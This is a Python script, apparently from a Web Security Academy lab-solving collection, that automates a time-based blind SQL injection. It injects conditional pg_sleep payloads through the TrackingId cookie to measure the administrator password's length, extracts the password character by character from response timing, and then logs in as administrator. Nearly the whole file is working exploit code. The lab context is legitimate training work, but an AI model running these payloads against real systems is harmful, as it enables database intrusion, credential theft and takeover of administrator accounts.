from web_security_academy.core.logger import logger
from bs4 import BeautifulSoup

import string
import time


def solve_lab(session):
    logger.info(
        f'Determining the length of the administrator password by visiting "/" with the following cookies:'
    )
    logger.info(
        '{"TrackingId": "\' || CASE WHEN (LENGTH((SELECT password FROM users WHERE username=\'administrator\'))=\033[1;93m?\033[00m) THEN pg_sleep(10) ELSE pg_sleep(0) END --"}'
    )
    logger.toggle_newline()

    len_pass = 1
    while True:
        cookies = {
            "TrackingId": f"' || CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator'))={len_pass}) THEN pg_sleep(10) ELSE pg_sleep(0) END --"
        }

        start = time.perf_counter()
        session.get_path("/", cookies=cookies)
        end = time.perf_counter()
        response_time = end - start

        if response_time < 10:
            logger.info(f"{len_pass} => {response_time:.2f} seconds")
            len_pass += 1
        else:
            logger.success(f"{len_pass} => {response_time:.2f} seconds")
            break

    logger.toggle_newline()
    logger.info(
        f'Determining administrator password by visiting "/" with the following cookies:'
    )
    logger.info(
        '{"TrackingId": "\' || CASE WHEN (SUBSTR((SELECT password FROM users WHERE username=\'administrator\'), \033[1;93m?\033[00m, 1)=\033[1;93m?\033[00m) THEN pg_sleep(10) ELSE pg_sleep(0) END --"}'
    )
    logger.toggle_newline()
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ""

    for i in range(len_pass):
        for c in alphabet:
            cookies = {
                "TrackingId": f"' || CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), {i+1}, 1)='{c}') THEN pg_sleep(10) ELSE pg_sleep(0) END --"
            }
            start = time.perf_counter()
            session.get_path("/", cookies=cookies)
            end = time.perf_counter()
            response_time = end - start

            if response_time < 10:
                logger.info(
                    f"{i+1}, '{c}' => {response_time:.2f} | Progress: {password}..."
                )
            else:
                logger.success(
                    f"{i+1}, '{c}' => {response_time:.1f} | Progress: {password}..."
                )
                password += c
                break
        else:
            logger.toggle_newline()
            logger.failure(f"Unable to determine character at index {i}")
            return

    logger.toggle_newline()
    logger.info(f"Successfully extracted administrator password: {password}")
    session.login("administrator", password)
